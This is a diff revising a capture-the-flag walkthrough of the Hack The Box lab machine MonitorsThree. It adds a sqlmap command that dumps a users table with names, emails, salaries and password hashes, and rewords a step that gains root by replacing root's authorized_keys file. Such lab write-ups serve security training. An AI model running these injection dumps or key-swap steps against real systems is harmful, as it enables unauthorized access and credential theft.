@@ -412,7 +412,28 @@ We will dump the `users` one:
 <br />
 
 ```bash
+❯ sqlmap -r request -D monitorsthree_db -T users --dump --batch --threads=10
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8.12#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
 
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+...[snip]...
+Database: monitorsthree_db
+Table: users
+[4 entries]
++----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+| id | dob        | email                       | name              | salary    | password                         | username  | position              | start_date |
++----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+| 2  | 1978-04-25 | admin@monitorsthree.htb     | Marcus Higgins    | 320800.00 | 31a181c8372e3afc59dab863430610e8 | admin     | Super User            | 2021-01-12 |
+| 5  | 1985-02-15 | mwatson@monitorsthree.htb   | Michael Watson    | 75000.00  | c585d01f2eb3e6e1073e92023088a3dd | mwatson   | Website Administrator | 2021-05-10 |
+| 6  | 1990-07-30 | janderson@monitorsthree.htb | Jennifer Anderson | 68000.00  | 1e68b6eb86b45f6d92f8f292428f77ac | janderson | Network Engineer      | 2021-06-20 |
+| 7  | 1982-11-23 | dthompson@monitorsthree.htb | David Thompson    | 83000.00  | 633b683cc128fe244b00f176c8a950f5 | dthompson | Database Manager      | 2022-09-15 |
++----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+...[snip]...
 ```
 
 <br />
@@ -1240,7 +1261,7 @@ marcus@monitorsthree:/dev/shm$ cat root.txt
 
 As we say before, there is no private key in `/root/.ssh`. 
 
-So, one thing that we can do to get a shell as `root`, is to replace root `authorized_keys` file with the marcus one.
+One way we can obtain a `root` shell is by replacing the root `authorized_keys` file with's marcus key.
 
 To do that we need to create a new backup, because the other was deleted (system clears automatically backups every 10 minutes).
 
@@ -1281,11 +1302,11 @@ uid=0(root) gid=0(root) groups=0(root)
 
 <br />
 
-Machine MonitorsThree pwned!!
+Machine MonitorsThree fully pwned!
 
 I really love this machine.
 
-Explain all the exploitation details was difficult but I had leaerned a lot by doing it, hope you too.
+Explain all the exploitation details was difficult but I had learned a lot by doing it, I hope you did too.
 
 Keep hacking!❤️❤️
 
